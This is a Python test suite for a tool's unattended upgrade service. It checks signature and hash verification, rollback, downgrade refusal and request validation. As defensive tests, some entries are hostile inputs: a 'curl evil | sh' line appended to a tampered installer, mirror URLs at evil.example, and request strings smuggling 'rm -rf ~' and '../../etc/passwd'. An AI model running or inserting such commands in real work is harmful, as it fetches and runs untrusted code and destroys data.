"""`ws upgrade --unattended`: the service proves a release itself, waits for idle, swaps, checks and rolls back.

A tmp HOME holds a real `ws install` (so the hook probes meet the real gate), a stand-in `ws` the stub installer
"installs" (its version is a file), and a fake release tree: a git repository with a really signed tag (a throwaway key),
assets with their hashes, and bundles a stub `cosign` verifies by digest and identity. Nothing reaches the network or
GitHub; the request is a file in a tmp state folder.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import shutil
import stat
import subprocess
import sys
from datetime import UTC, datetime
from pathlib import Path

import pytest

from ws import agentsession, approvals, cli, paths, queue, selfcmd, upgrade, upgradecheck, upgradeproof, version
from ws.term import bridge

GIT, KEYGEN = shutil.which("git"), shutil.which("ssh-keygen")
pytestmark = pytest.mark.skipif(GIT is None or KEYGEN is None, reason="needs git and ssh-keygen")

OLD, NEW, TAG = "0.1.11.6", "0.1.11.8", "v0.1.11.8"
REPO = "owner/ws"
IDENTITY = f"https://github.com/{REPO}/.github/workflows/release.yml@refs/tags/{{tag}}"
ISSUER = "https://token.actions.githubusercontent.com"

COSIGN = """#!{py}
import hashlib, json, os, sys
a = sys.argv[1:]
opt = lambda n: a[a.index(n) + 1]
open(os.path.join(os.path.dirname(__file__), "cosign.log"), "a").write(" ".join(a) + "\\n")
b = json.load(open(opt("--bundle")))
ok = (b["digest"] == hashlib.sha256(open(a[-1], "rb").read()).hexdigest()
      and b["identity"] == opt("--certificate-identity") and b["issuer"] == opt("--certificate-oidc-issuer"))
sys.exit(0 if ok else 1)
"""
UV = """#!{py}
import os, sys
sys.stdout.write(open(os.path.join(os.path.dirname(__file__), "audit.json")).read())
"""
STUB_WS = """import os, sys
state = os.environ["STUB_STATE"]
if sys.argv[1:] == ["--version"]:
    print("ws " + open(os.path.join(state, "version")).read().strip())
elif sys.argv[1:] == ["upgrade", "--hooks-only"]:
    pass
else:
    sys.exit(2)
"""
# what the stub installer does for `--version TAG`; BAD_RELEASE and DROP_DENY are files the test plants
INSTALLER = """#!/usr/bin/env bash
echo "$@" >> "$INSTALL_LOG"
env | sort > "$INSTALL_ENV"
[ -f "$STUB_STATE/fail" ] && exit 1
v="${@: -1}"; v="${v#v}"
if [ "$v" = "0.1.11.8" ] && [ -f "$STUB_STATE/bad_release" ]; then v="9.9.9"; fi
if [ "$v" = "0.1.11.8" ] && [ -f "$STUB_STATE/drop_deny" ]; then
  python3 -c "import json,os; p=os.environ['HOME']+'/.claude/settings.json'; d=json.load(open(p)); d['permissions']['deny'].pop(); json.dump(d, open(p,'w'))"
fi
echo "$v" > "$STUB_STATE/version"
"""


def sha(data: bytes) -> str:
    return hashlib.sha256(data).hexdigest()


class Release:
    """A fake release of `TAG`: a signed git tag, the installer and wheel assets with hashes and bundles, check runs."""

    def __init__(self, root: Path, key: Path, tag: str = TAG, signed: bool = True) -> None:
        self.tag, self.root = tag, root
        self.runs = [{"name": "ci", "status": "completed", "conclusion": "success"}]
        self.wheel_name = f"ws_aitoolkit-{tag[1:]}-py3-none-any.whl"
        origin = root / "origin"
        origin.mkdir(parents=True)
        env = {**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull}
        env |= {"GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.com", "GIT_COMMITTER_NAME": "t"}
        env["GIT_COMMITTER_EMAIL"] = "t@example.com"
        (origin / "uv.lock").write_text("version = 1\n", encoding="utf-8")
        sign = ["-c", "gpg.format=ssh", "-c", f"user.signingkey={key}"]
        tag_cmd = [*sign, "tag", "-s", "-m", tag, tag] if signed else ["tag", tag]
        for argv in (["init", "-q"], ["add", "."], ["commit", "-q", "-m", "x"], tag_cmd):
            subprocess.run([GIT, *argv], cwd=origin, env=env, check=True, capture_output=True)
        self.origin = origin
        self.assets: dict[str, bytes] = {}
        self.add("install.sh", INSTALLER.encode())
        self.add(self.wheel_name, b"wheel bytes")

    def add(self, name: str, data: bytes) -> None:
        self.assets[name] = data
        self.assets[f"{name}.sha256"] = f"{sha(data)}  {name}\n".encode()
        bundle = {"digest": sha(data), "identity": IDENTITY.format(tag=self.tag), "issuer": ISSUER}
        self.assets[f"{name}.sigstore.json"] = json.dumps(bundle).encode()

    def asset(self, tag: str, name: str) -> bytes:
        if name not in self.assets:
            raise upgradeproof.Refused(f"could not read {name} (HTTPError)")
        return self.assets[name]

    def checkout(self, tag: str, dest: Path) -> None:
        subprocess.run([GIT, "clone", "-q", str(self.origin), str(dest)], check=True, capture_output=True)

    def check_runs(self, sha_: str) -> list[dict]:
        return self.runs


def keygen(path: Path) -> str:
    subprocess.run([KEYGEN, "-q", "-t", "ed25519", "-N", "", "-f", str(path), "-C", ""], check=True)
    return path.with_suffix(".pub").read_text(encoding="utf-8").split()[1]


@pytest.fixture
def svc(tmp_path, monkeypatch):
    """The service's world: a tmp HOME with ws installed, stub tools first on the PATH, a trust root, the old ws installed."""
    home = tmp_path / "home"
    home.mkdir()
    state = tmp_path / "stubstate"
    state.mkdir()
    (state / "version").write_text(OLD, encoding="utf-8")
    tools = tmp_path / "tools"
    tools.mkdir()
    for name, text in (("cosign", COSIGN), ("uv", UV)):
        tool = tools / name
        tool.write_text(text.format(py=sys.executable), encoding="utf-8")
        tool.chmod(tool.stat().st_mode | stat.S_IXUSR)
    stubws = tmp_path / "stubws.py"
    stubws.write_text(STUB_WS, encoding="utf-8")
    (tools / "audit.json").write_text(json.dumps({"vulnerabilities": []}), encoding="utf-8")
    key = tmp_path / "key"
    blob = keygen(key)
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("WS_HOME", str(home / ".ws"))
    monkeypatch.setenv("XDG_STATE_HOME", str(home / ".local" / "state"))
    monkeypatch.setenv("WS_GATE_DAEMON", "0")
    monkeypatch.setenv("PATH", f"{tools}{os.pathsep}{os.environ['PATH']}")
    for name, value in {
        "INSTALL_LOG": tmp_path / "install.log",
        "INSTALL_ENV": tmp_path / "install.env",
        "STUB_STATE": state,
        "INVOCATION_ID": "abc",
    }.items():
        monkeypatch.setenv(name, str(value))
    for var in (
        *upgrade.MIRROR_VARS,
        approvals.ENV_MARKER,
        approvals.SANDBOX_MARKER,
        approvals.FD_ENV,
        *bridge.RUNNER_SESSION_NAMES,
    ):
        monkeypatch.delenv(var, raising=False)
    monkeypatch.setattr(paths, "account_home", lambda: home.resolve())
    monkeypatch.setattr(agentsession, "read_ancestry", list)  # no runner above this test
    monkeypatch.setattr(upgrade, "_parent_comm", lambda pid: "systemd")
    monkeypatch.setattr(upgrade, "__version__", OLD)
    monkeypatch.setattr(selfcmd, "unstable", lambda cmd=None: None)
    root = {
        "repo": REPO,
        "identity": IDENTITY,
        "issuer": ISSUER,
        "tag_signers": f'ws-release namespaces="git" ssh-ed25519 {blob}\n',
    }
    monkeypatch.setattr(version, "trust_root", lambda: root)
    monkeypatch.setattr(
        upgrade,
        "installed_ws",
        lambda env: upgrade.NewWs(
            [sys.executable, str(stubws)], sys.executable, (state / "version").read_text().strip(), "a stand-in"
        ),
    )
    assert cli.main(["install", "--yes", "--runner", "claude-code", "--notes", str(home / "Notes")]) == 0
    real_idle = upgrade.idle_reason
    monkeypatch.setattr(upgrade, "idle_reason", lambda env: None)
    world = argparse.Namespace(
        home=home, state=state, key=key, tmp=tmp_path, root=root, real_idle=real_idle, tools=tools
    )
    world.release = lambda **kw: Release(tmp_path / f"rel{len(list(tmp_path.glob('rel*')))}", key, **kw)
    return world


def request(svc, text: str) -> Path:
    path = upgrade.request_path(os.environ)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text, encoding="utf-8")
    return path


def args(**kw) -> argparse.Namespace:
    base = {
        "json": False,
        "dry_run": False,
        "unattended": True,
        "installer": None,
        "version": None,
        "channel": None,
        "hooks_only": False,
        "rollback": False,
        "check": None,
        "session_check": None,
        "step_timeout": None,
        "install_timeout": None,
    }
    return argparse.Namespace(**{**base, **kw})


def serve(svc, release: Release | None = None, text: str = TAG, **kw) -> int:
    request(svc, text)
    return upgrade.cmd_unattended(args(**kw), os.environ, source=release or svc.release(), sleep=lambda s: None)


def installed(svc) -> str:
    return (svc.state / "version").read_text().strip()


def rows() -> list[dict]:
    return upgradecheck.last_rows(os.environ)


def history() -> list[tuple]:
    return [(d["verb"], d["from"], d["to"]) for d in upgrade.history(os.environ)]


# ---- a good release, and the ones that are refused ----------------------------------------------------------------------------


def test_good_release_upgrades(svc):
    release = svc.release()
    assert serve(svc, release) == 0
    assert installed(svc) == NEW and history() == [("promote", OLD, NEW)]
    assert not upgrade.request_path(os.environ).exists()  # taken: the path unit must not fire again
    assert [(r["verb"], r["to"], r["result"]) for r in rows()] == [("promote", TAG, "ok")]
    cosign = Path(svc.tools / "cosign.log").read_text().splitlines()
    assert len(cosign) == 2 and all(f"--certificate-identity {IDENTITY.format(tag=TAG)}" in c for c in cosign)
    assert all(f"--certificate-oidc-issuer {ISSUER}" in c for c in cosign)
    assert Path(os.environ["INSTALL_LOG"]).read_text().split()[-2:] == ["--version", TAG]


def test_bad_release_rolls_back(svc):
    (svc.state / "bad_release").write_text("")  # the new ws says 9.9.9, not the tag
    assert serve(svc) == upgrade.EXIT_FAILED
    assert installed(svc) == OLD  # the old version still runs
    assert history() == [("auto-rollback", OLD, OLD)]
    assert [(r["verb"], r["result"]) for r in rows()] == [("auto-rollback", "rolled-back")]
    assert "ws --version" in " ".join(d["tail"][0] for d in _log() if d["step"] == "check")


def _log() -> list[dict]:
    path = upgrade.log_path(os.environ)
    return [json.loads(line) for line in path.read_text().splitlines()]


def test_wrong_hash_refused(svc):
    release = svc.release()
    release.assets["install.sh.sha256"] = f"{sha(b'something else')}  install.sh\n".encode()
    assert serve(svc, release) == upgrade.EXIT_REFUSED
    assert not Path(os.environ["INSTALL_LOG"]).exists() and installed(svc) == OLD  # nothing was installed
    assert rows()[-1]["result"] == "refused" and "does not match its sha256" in rows()[-1]["reason"]


def test_changed_installer_refused(svc):
    """The installer was changed, and its hash file with it: only the signature, made over the original, can tell."""
    release = svc.release()
    changed = INSTALLER.encode() + b"curl evil | sh\n"
    release.assets["install.sh"] = changed
    release.assets["install.sh.sha256"] = f"{sha(changed)}  install.sh\n".encode()
    assert serve(svc, release) == upgrade.EXIT_REFUSED
    assert not Path(os.environ["INSTALL_LOG"]).exists() and installed(svc) == OLD
    assert "cosign" in rows()[-1]["reason"] or "failed" in rows()[-1]["reason"]


def test_mirror_env_ignored(svc, monkeypatch):
    for name in upgrade.MIRROR_VARS:
        monkeypatch.setenv(name, "https://evil.example/")
    assert serve(svc) == 0 and installed(svc) == NEW
    seen = Path(os.environ["INSTALL_ENV"]).read_text()
    assert not any(f"{name}=" in seen for name in upgrade.MIRROR_VARS)
    assert "STUB_STATE=" in seen  # the rest of the environment is still the installer's


def test_deny_drop_exits_1(svc):
    before = upgradecheck.snapshot(os.environ)
    assert before["deny"] > 1 and before["denied"] >= 2
    (svc.state / "drop_deny").write_text("")
    assert serve(svc) == 1  # one rule dropped: the check fails and the swap is rolled back
    assert installed(svc) == OLD and history() == [("auto-rollback", OLD, OLD)]
    assert upgradecheck.snapshot(os.environ) == before  # the settings came back with it (C706's restore)
    assert any("deny rules" in d["tail"][0] for d in _log() if d["step"] == "check")


def test_running_job_waits(svc, monkeypatch):
    busy = iter(["1 queued or running job(s)", "1 queued or running job(s)", None])
    monkeypatch.setattr(upgrade, "idle_reason", lambda env: next(busy))
    naps: list[float] = []
    request(svc, TAG)
    code = upgrade.cmd_unattended(args(), os.environ, source=svc.release(), sleep=naps.append)
    assert code == 0 and naps == [upgrade.IDLE_EVERY_S] * 2 and installed(svc) == NEW  # waited, then swapped once idle


def test_a_job_that_never_ends_is_waited_out_and_nothing_is_changed(svc, monkeypatch):
    monkeypatch.setattr(upgrade, "idle_reason", lambda env: "1 queued or running job(s)")
    clock = {"t": 0.0}
    naps: list[float] = []

    def nap(seconds: float) -> None:
        naps.append(seconds)
        clock["t"] += seconds

    with pytest.raises(upgradeproof.Refused) as caught:
        upgrade.wait_idle(os.environ, nap, lambda: clock["t"])
    assert "still busy after 30 minutes" in str(caught.value) and len(naps) == 60


def test_a_queued_job_makes_the_machine_busy(svc):
    assert svc.real_idle(os.environ) is None
    ledger = queue.Ledger(paths.state_dir(dict(os.environ)))
    req = queue.Request(job="digest", run_id="20261123T000000Z-000001", cap_usd=100.0, usd=1.0, turns=5, seconds=60.0)
    assert ledger.admit(req, datetime.now(UTC)).kind == "admit"
    assert svc.real_idle(os.environ) == "1 queued or running job(s)"


def test_session_refused(svc, monkeypatch):
    """Each sign that this is not the service is refused before the request is read: a session marker, no systemd
    invocation, a parent that is not the user manager."""
    req = request(svc, TAG)
    cases = [
        ("not for a session", lambda: monkeypatch.setenv(approvals.ENV_MARKER, "1"), lambda: monkeypatch.delenv(approvals.ENV_MARKER)),
        ("INVOCATION_ID", lambda: monkeypatch.delenv("INVOCATION_ID"), lambda: monkeypatch.setenv("INVOCATION_ID", "abc")),
        ("the parent here is bash", lambda: monkeypatch.setattr(upgrade, "_parent_comm", lambda pid: "bash"), lambda: monkeypatch.setattr(upgrade, "_parent_comm", lambda pid: "systemd")),
    ]  # fmt: skip
    for fragment, plant, undo in cases:
        plant()
        with pytest.raises(upgrade.WsError) as caught:
            upgrade.cmd_unattended(args(), os.environ, source=svc.release())
        assert fragment in caught.value.message and caught.value.exit_code == upgrade.EXIT_REFUSED
        assert req.exists() and not Path(os.environ["INSTALL_LOG"]).exists()  # nothing was read, nothing was installed
        undo()


def test_the_command_line_refuses_outside_its_unit(svc, monkeypatch, capsys):
    monkeypatch.delenv("INVOCATION_ID")
    assert cli.main(["upgrade", "--unattended"]) == upgrade.EXIT_REFUSED
    assert "INVOCATION_ID" in capsys.readouterr().err


def test_downgrade_refused(svc):
    """The installed ws is 0.1.11.6: the same tag, an older one, a shorter one and a candidate of it are all refused."""
    for tag in ("v0.1.11.6", "v0.1.11.5", "v0.1.10", "v0.0.1", "v0.1.11.6rc1"):
        assert serve(svc, svc.release(tag=tag), text=tag) == upgrade.EXIT_REFUSED
        assert installed(svc) == OLD and not Path(os.environ["INSTALL_LOG"]).exists()
        assert "not newer than the installed ws" in rows()[-1]["reason"]


def test_rollback_goes_only_to_the_previous_release(svc, monkeypatch):
    """The target is read from the upgrade history, never from the request; its installer is fetched for that tag."""
    fetched: list[str | None] = []

    def fetch(dest, version=None):
        fetched.append(version)
        (dest / "install.sh").write_text(INSTALLER, encoding="utf-8")
        return dest / "install.sh"

    monkeypatch.setattr(upgrade, "fetch_installer", fetch)
    upgrade.record(os.environ, "promote", "0.1.11.4", OLD)
    code = serve(svc, text="rollback")
    assert code == 0 and installed(svc) == "0.1.11.4"
    assert Path(os.environ["INSTALL_LOG"]).read_text().split()[-2:] == ["--version", "v0.1.11.4"]
    assert fetched == ["v0.1.11.4"]
    assert [(r["verb"], r["to"], r["result"]) for r in rows()] == [("rollback", "0.1.11.4", "ok")]


def test_rollback_with_nothing_on_record_is_refused(svc):
    assert serve(svc, text="rollback") == upgrade.EXIT_REFUSED
    assert "no earlier release" in rows()[-1]["reason"] and not Path(os.environ["INSTALL_LOG"]).exists()


@pytest.mark.parametrize(
    "text", ["rollback to v0.0.1", "v0.1.11.8; rm -rf ~", "../../etc/passwd", "https://x/y", "", "v1\nv2"]
)
def test_a_request_that_is_not_a_tag_or_rollback_is_dropped(svc, text):
    assert serve(svc, text=text) == 0
    assert not Path(os.environ["INSTALL_LOG"]).exists() and rows()[-1]["result"] == "dropped"
    assert not upgrade.request_path(os.environ).exists()


def test_the_request_path_is_outside_every_protected_root(svc):
    path = upgrade.request_path(os.environ)
    assert path == svc.home / ".local" / "state" / "ws-upgrade" / "request.json"
    assert not str(path).startswith(str(svc.home / ".ws"))


# ---- what the proof insists on ------------------------------------------------------------------------------------------------


def test_a_tag_signed_by_someone_else_is_refused(svc):
    other = svc.tmp / "other"
    keygen(other)
    release = Release(svc.tmp / "relx", other)
    assert serve(svc, release) == upgrade.EXIT_REFUSED and installed(svc) == OLD
    assert "tag -v" in rows()[-1]["reason"] or "failed" in rows()[-1]["reason"]


def test_an_unsigned_tag_is_refused(svc):
    release = Release(svc.tmp / "relu", svc.key, signed=False)
    assert serve(svc, release) == upgrade.EXIT_REFUSED
    assert "not a signed (annotated) tag" in rows()[-1]["reason"]


def test_a_release_whose_checks_are_not_green_is_refused(svc):
    release = svc.release()
    release.runs = [*release.runs, {"name": "doctor", "status": "completed", "conclusion": "failure"}]
    assert serve(svc, release) == upgrade.EXIT_REFUSED
    assert "not all green (doctor)" in rows()[-1]["reason"] and installed(svc) == OLD
    release.runs = []  # no check ran at all is not green either
    assert serve(svc, release) == upgrade.EXIT_REFUSED and "none ran" in rows()[-1]["reason"]


@pytest.mark.parametrize(
    "report, refused",
    [
        ({"vulnerabilities": [{"id": "X", "severity": "HIGH"}]}, True),
        ({"vulnerabilities": [{"id": "X", "database_specific": {"severity": "Critical"}}]}, True),
        ({"vulnerabilities": [{"id": "X"}]}, True),  # no severity: counted as high
        ({"vulnerabilities": [{"id": "X", "severity": "moderate"}]}, False),
        ({"vulnerabilities": []}, False),
        ({"unexpected": "shape"}, True),  # unreadable: fails closed
    ],
)
def test_an_open_high_advisory_refuses_the_release(svc, report, refused):
    (svc.tools / "audit.json").write_text(json.dumps(report), encoding="utf-8")
    assert serve(svc) == (upgrade.EXIT_REFUSED if refused else 0)
    assert installed(svc) == (OLD if refused else NEW)


def test_a_ws_with_no_trust_root_refuses(svc, monkeypatch):
    monkeypatch.setattr(version, "trust_root", lambda: None)
    assert serve(svc) == upgrade.EXIT_REFUSED and "no trust root" in rows()[-1]["reason"]


def test_one_upgrade_an_hour(svc):
    assert serve(svc) == 0
    monkey = "v0.1.11.9"
    assert serve(svc, svc.release(tag=monkey), text=monkey) == upgrade.EXIT_REFUSED
    assert "one at a time" in rows()[-1]["reason"] and installed(svc) == NEW


def test_a_failing_session_check_rolls_back(svc):
    assert serve(svc, session_check=f"{sys.executable} -c 'raise SystemExit(3)'") == 1
    assert installed(svc) == OLD and any(
        "session check exits 3" in d["tail"][0] for d in _log() if d["step"] == "check"
    )


def test_the_unattended_flag_is_hidden_from_help_and_never_a_terminal_command(capsys):
    with pytest.raises(SystemExit):
        cli.main(["upgrade", "--help"])
    out = capsys.readouterr().out
    assert "--unattended" not in out and "--session-check" in out


def test_the_hooks_step_of_an_unattended_swap_runs_without_a_terminal(svc, monkeypatch):
    """The child `ws upgrade --hooks-only` has no terminal and the service's invocation: it is let through, a session isn't."""
    with Path(os.devnull).open() as devnull:
        monkeypatch.setattr(sys, "stdin", devnull)
        assert cli.main(["upgrade", "--hooks-only"]) == upgrade.EXIT_REFUSED  # not a step of the service: no terminal
        monkeypatch.setenv(upgrade.STEP_ENV, "1")
        assert cli.main(["upgrade", "--hooks-only"]) == 0
        monkeypatch.setenv(approvals.ENV_MARKER, "1")
        assert cli.main(["upgrade", "--hooks-only"]) == upgrade.EXIT_REFUSED


def test_versions_sort_by_part_and_a_candidate_sorts_below_its_release():
    key = upgradeproof.version_key
    assert key("v0.1.11.8") > key("0.1.11.6") > key("0.1.11") > key("0.1.10.9")
    assert key("v0.2.0rc1") < key("v0.2.0") and key("v0.2.0rc1") > key("v0.1.99")
    assert key("0.1.9.dev0") is None and key("") is None
